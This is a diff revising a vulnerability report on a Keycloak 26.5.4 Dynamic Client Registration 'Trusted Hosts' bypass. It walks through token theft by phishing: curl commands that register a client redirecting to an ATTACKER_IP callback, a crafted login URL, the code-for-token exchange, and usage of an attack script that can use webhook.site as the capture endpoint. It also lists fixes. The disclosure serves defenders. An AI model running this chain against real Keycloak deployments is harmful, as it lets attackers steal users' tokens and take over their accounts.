@@ -1,25 +1,25 @@
-# Finding #5: DCR Trusted Hosts Bypass — Live Token Theft via Phishing
-
-| Field | Value |
-|---|---|
-| **Severity** | HIGH (CVSS 8.0) |
-| **Affected Version** | Keycloak 26.5.4 (latest stable, reproduction confirmed) |
-| **Vulnerability Type** | Broken Access Control / Privilege Escalation via Client Registration Policy Bypass |
-| **Affected Components** | DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`), Client Registration Policy Engine |
-| **Validation Date** | 2026-02-21 |
-| **Researcher** | Anggi Pradana |
-
----
+# DCR Trusted Hosts Bypass — Token Theft via Phishing
 
 ## Summary
 
-Dynamic Client Registration (DCR) policy "Trusted Hosts" only applies to anonymous registrations. A user with the `create-client` role (realm-management) can register an OIDC client with any `redirect_uris` (including to an attacker-controlled server) via authenticated DCR. This enables a live phishing attack: the attacker generates a phishing URL from the real Keycloak domain, runs a capture server, waits for the victim to login, then automatically steals the victim's token.
+- Dynamic Client Registration (DCR) policy "Trusted Hosts" only applies to anonymous registrations. A user with the `create-client` role (realm-management) can register an OIDC client with any `redirect_uris` (including to an attacker-controlled server) via authenticated DCR. This enables a live phishing attack: the attacker generates a phishing URL from the real Keycloak domain, runs a capture server, waits for the victim to login, then automatically steals the victim's token.
 
----
+## Vulnerability Type
 
-## Configuration Context
+- Broken Access Control / Privilege Escalation via Client Registration Policy Bypass
 
-Default DCR policy configuration. The `Trusted Hosts` policy exists in subType `anonymous` but is **absent** from subType `authenticated`. The `create-client` role (realm-management) is typically delegated to developers for self-service client registration.
+## Affected Component(s)
+
+- DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`)
+- Client Registration Policy Engine (subType `authenticated` missing Trusted Hosts policy)
+
+## Affected Version(s)
+
+- Keycloak 26.5.4 (latest stable, reproduction confirmed)
+
+## Keycloak Configuration Context (If Applicable)
+
+- Default DCR policy configuration. The `Trusted Hosts` policy exists in subType `anonymous` but is **absent** from subType `authenticated`. The `create-client` role (realm-management) is typically delegated to developers for self-service client registration.
 
 ---
 
@@ -78,7 +78,7 @@ The registered malicious client:
 
 ---
 
-## Steps to Reproduce
+## Steps to Reproduce (Proof of Concept - PoC)
 
 **Prerequisites:**
 - Realm: `test`
@@ -91,7 +91,7 @@ The registered malicious client:
 Run the setup script on the KC server (or any machine with admin access):
 
 ```bash
-python3 pocs/setup_f5_admin.py --host http://localhost:8080 --realm test
+python3 pocs/setup_dcr_admin.py --host http://localhost:8080 --realm test
 ```
 
 Or manually via CLI:
@@ -134,7 +134,7 @@ REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-regist
   -H "Content-Type: application/json" \
   -d '{
     "client_name": "Aplikasi Resmi Perusahaan",
-    "redirect_uris": ["http://46.101.162.187:48888/callback"],
+    "redirect_uris": ["http://ATTACKER_IP:48888/callback"],
     "grant_types": ["authorization_code","refresh_token"],
     "response_types": ["code"]
   }')
@@ -147,7 +147,7 @@ echo "$REG_RESP" | python3 -m json.tool
 {
   "client_id": "425bebcb-4dc1-4467-adf1-6d20815712b3",
   "client_secret": "YDEWNkAWu6BanGdCamm8wGGZmHcWXz7D",
-  "redirect_uris": ["http://46.101.162.187:48888/callback"],
+  "redirect_uris": ["http://ATTACKER_IP:48888/callback"],
   "grant_types": ["authorization_code", "refresh_token"]
 }
 ```
@@ -157,7 +157,7 @@ echo "$REG_RESP" | python3 -m json.tool
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
   -H "Content-Type: application/json" \
-  -d '{"client_name":"anon-test","redirect_uris":["http://46.101.162.187:48888/callback"]}'
+  -d '{"client_name":"anon-test","redirect_uris":["http://ATTACKER_IP:48888/callback"]}'
 ```
 
 ```json
@@ -175,7 +175,7 @@ Attacker starts an HTTP listener server then generates the phishing URL:
 http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
   client_id=425bebcb-4dc1-4467-adf1-6d20815712b3&
   response_type=code&
-  redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&
+  redirect_uri=http%3A%2F%2FATTACKER_IP%3A48888%2Fcallback&
   scope=openid+profile+email
 ```
 
@@ -186,16 +186,20 @@ This URL is 100% legitimate — real Keycloak domain. The victim has no reason t
 Victim sees the real Keycloak login page. After logging in, Keycloak redirects to the attacker's server:
 
 ```
-HTTP 302 → http://46.101.162.187:48888/callback?code=7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
+HTTP 302 → http://ATTACKER_IP:48888/callback?code=7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
 ```
 
 The attacker's server automatically captures the auth code and displays a fake "Login Successful!" page to the victim.
 
-### Step 7 — Attacker exchanges auth code → victim's token
+### Step 7 — Attacker exchanges auth code for victim's token
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
-  -d "client_id=425bebcb-...&client_secret=YDEWNkAW...&grant_type=authorization_code&code=7e7cad47-...&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback"
+  -d "client_id=$MAL_CLIENT_ID" \
+  -d "client_secret=$MAL_SECRET" \
+  -d "grant_type=authorization_code" \
+  -d "code=$AUTH_CODE" \
+  -d "redirect_uri=http://ATTACKER_IP:48888/callback"
 ```
 
 **Victim's token successfully stolen:**
@@ -213,7 +217,7 @@ Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...
 
 ```bash
 curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
-  -H "Authorization: Bearer eyJhbGciOiJSUzI1Ni..."
+  -H "Authorization: Bearer $VICTIM_ACCESS_TOKEN"
 ```
 
 ```json
@@ -224,6 +228,46 @@ curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo 
   "email": "victim@test.com"
 }
 ```
+
+### Automated PoC Script
+
+**Files:**
+- `pocs/setup_dcr_admin.py` — One-time admin setup (creates users, assigns roles)
+- `pocs/poc_dcr_hijack.py` — Main attack script (runs from any machine)
+
+**Setup (one-time, on KC server or any machine with admin access):**
+
+```bash
+python3 setup_dcr_admin.py --host http://localhost:8080
+```
+
+**Attack (from any machine — no admin needed):**
+
+```bash
+# With local listener (attacker has public IP):
+python3 poc_dcr_hijack.py --host http://46.101.162.187:8080 --attacker-host ATTACKER_IP
+
+# With webhook.site (attacker has no public IP):
+python3 poc_dcr_hijack.py --host http://46.101.162.187:8080 --use-webhook
+
+# Automated mode (simulate victim for testing):
+python3 poc_dcr_hijack.py --host http://46.101.162.187:8080 --attacker-host 46.101.162.187 --auto-victim --timeout 30
+```
+
+**Parameters:**
+- `--host` — Keycloak public URL (required)
+- `--attacker-host` — Attacker's public IP/hostname for callback listener
+- `--use-webhook` — Use webhook.site as callback (no public IP needed)
+- `--listen-port` — Attacker's phishing server port (default: 48888)
+- `--realm` — Target realm (default: test)
+- `--timeout` — Timeout waiting for victim in seconds (default: 300)
+- `--auto-victim` — Automatically simulate victim login (for testing/CI)
+
+The attack script supports two callback modes:
+- **Local listener** (`--attacker-host`): Runs an HTTP server on the attacker's machine to capture the auth code redirect
+- **webhook.site** (`--use-webhook`): Uses webhook.site as the callback endpoint (no public IP needed)
+
+The attack script uses ZERO admin API calls or localhost connections. It operates entirely through public Keycloak endpoints, making it a realistic remote attacker scenario.
 
 ---
 
@@ -239,55 +283,12 @@ curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo 
 
 ## Recommendations
 
-1. **Apply the `Trusted Hosts` policy to subType `authenticated`.** The same URI validation must be enforced for authenticated registrations. This is the primary fix.
-2. **Require admin approval for DCR clients.** Add a `client-disabled` policy to the authenticated subType so new clients require admin activation before they can initiate auth flows.
-3. **Add URI domain validation to the `authenticated` policy set.** Restrict `redirect_uris` to pre-approved domains.
-4. **Audit clients already registered via DCR** for redirect URIs that should not be there.
+- **Apply the `Trusted Hosts` policy to subType `authenticated`.** The same URI validation must be enforced for authenticated registrations. This is the primary fix.
+- **Require admin approval for DCR clients.** Add a `client-disabled` policy to the authenticated subType so new clients require admin activation before they can initiate auth flows.
+- **Add URI domain validation to the `authenticated` policy set.** Restrict `redirect_uris` to pre-approved domains.
+- **Audit clients already registered via DCR** for redirect URIs that should not be there.
 
----
+## Supporting Material/References
 
-## Proof of Concept — Full Source Code
-
-**Files:**
-- `pocs/setup_f5_admin.py` — One-time admin setup (creates users, assigns roles)
-- `pocs/poc_f5_dcr_hijack.py` — Main attack script (runs from any machine)
-
-**Setup (one-time, on KC server or any machine with admin access):**
-
-```bash
-python3 setup_f5_admin.py --host http://localhost:8080
-```
-
-**Attack (from any machine — no admin needed):**
-
-```bash
-# With local listener (attacker has public IP):
-python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --attacker-host ATTACKER_IP
-
-# With webhook.site (attacker has no public IP):
-python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --use-webhook
-
-# Automated mode (simulate victim for testing):
-python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --attacker-host 46.101.162.187 --auto-victim --timeout 30
-```
-
-**Parameters:**
-- `--host` — Keycloak public URL (required)
-- `--attacker-host` — Attacker's public IP/hostname for callback listener
-- `--use-webhook` — Use webhook.site as callback (no public IP needed)
-- `--listen-port` — Attacker's phishing server port (default: 48888)
-- `--realm` — Target realm (default: test)
-- `--timeout` — Timeout waiting for victim in seconds (default: 300)
-- `--auto-victim` — Automatically simulate victim login (for testing/CI)
-
-**Source:** See `pocs/poc_f5_dcr_hijack.py` and `pocs/setup_f5_admin.py` for full source code.
-
-The attack script supports two callback modes:
-- **Local listener** (`--attacker-host`): Runs an HTTP server on the attacker's machine to capture the auth code redirect
-- **webhook.site** (`--use-webhook`): Uses webhook.site as the callback endpoint (no public IP needed)
-
-Key design: The attack script uses ZERO admin API calls or localhost connections. It operates entirely through public Keycloak endpoints, making it a realistic remote attacker scenario.
-
----
-
-*This finding was validated on 2026-02-21 against a fresh Keycloak 26.5.4 instance on the researcher's private VPS. No production systems, real user data, or third-party infrastructure was accessed.*
+- PoC video: *(to be added)*
+- Source code: `pocs/poc_dcr_hijack.py`, `pocs/setup_dcr_admin.py`
